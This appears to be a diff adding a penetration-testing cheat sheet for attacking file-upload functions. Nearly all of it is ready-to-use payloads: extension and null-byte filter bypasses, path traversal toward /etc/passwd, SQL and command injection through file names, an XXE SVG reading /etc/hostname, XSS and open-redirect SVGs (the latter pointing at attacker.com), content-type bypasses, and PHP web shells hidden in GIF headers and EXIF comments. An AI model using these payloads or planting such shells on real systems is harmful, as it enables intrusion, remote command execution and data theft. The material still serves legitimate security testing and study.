@@ -1,0 +1,103 @@
+UPLOAD FUNCTION
+-->BLOCKLISTING BYPASS
+	[+] PHP ->.phtm,phtml,.phps,.pht,.php2,.php3,.php4,.php5,.shtml,.phar,.pgif,.inc
+	[+] ASP ->asp,.aspx,.cer,.asa
+	[+] Jsp ->.jsp,.jspx,.jsw,.jsv,.jspf
+	[+] Coldfusion ->.cfm,.cfm1,.cfc,.dbm
+	[+] Random -> .pHp,.pHP5,.PhAr
+-->WHITELISTING BYPASS
+	[+]file.jpg.php
+	[+]file.php.jpg
+	[+]file.php.blah123jpg
+	[+]file.php%00.jpg
+	[+]file.php\x00.jpg
+	[+]file.php%00
+	[+]file.php%20
+	[+]file.php%0d%0a.jpg
+	[+]file.php.....
+	[+]file.php/
+	[+]file.php.\
+	[+]file.
+	[+].html
+-->DIRECTORY TRAVERSAL
+	[+]set filename ../../etc/passwd/logo.png
+	[+]Set filename ../../../logo.png as might change website logo
+-->SQL INJECTION
+	[+]set filename 'sleep(10).jpg
+	[+]set filename sleep(10)-- -.jpg
+-->COMMAND INJECTION
+	[+]set filename ; sleep 10;
+--XXE
+	[+]Upload using .svg
+		<?xml version="1.0" standalone="yes"?>
+		<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+		<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+			<text font-size="40" x="0" y="16">&xxe;</text>
+		</svg>
+-->XSS
+	[+]set filename <svg onload=alert(document.domain)>
+	[+]Upload using .svg file
+		<?xml version="1.0" standalone="no"?>
+		<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+		<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+		<rect width="300" height="100" style="fill:rgb(0,0,255);strok-width:3;stroke:rgb(0,0,0)" />
+		<script type="text/javascript">
+			alert("cyberbyte00 XSS");
+		</script>
+		</svg>
+
+-->OPEN REDIRECT
+	[+]Upload using .svg
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	<code>
+	<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+	<svg onload="window.location='https://attacker.com'" xmlns="http://www.w3.org/2000/svg">
+	<rect width="300" height="100" style="file:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+	</svg>
+	</code>
+
+-->CONTENT_ISH BYPASS
+	[+]Content-type Validation
+	[+]Upload file.php and change the Content-type:application/x-php
+		Content-Type:application/octet-stream
+		Content-type:image/png 
+		Content-type:image/gif
+		Content-type:image/jpg
+
+	[+]CONTENT LENGTH VALIDATION set (<?=$_GET[x]`?>)
+	[+]CONTENT BYPASS SHELL (Content-type:image/gif)
+		GIF89a; <?php system($_GET['cmd']); ?>
+
+-->MISC
+	[+]Upload file.js or file.config web.config
+	[+]Pixel Flood attack using image
+	[+]DOS with file name 1....99.png
+	[+]ZIP SLIP
+		.zip 
+	[+]IMAGE SHELL
+		mv pic.jpg pic.php.jpg
+		exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
+
+
+
+Payload: */alert(1)</script><script>/*
+
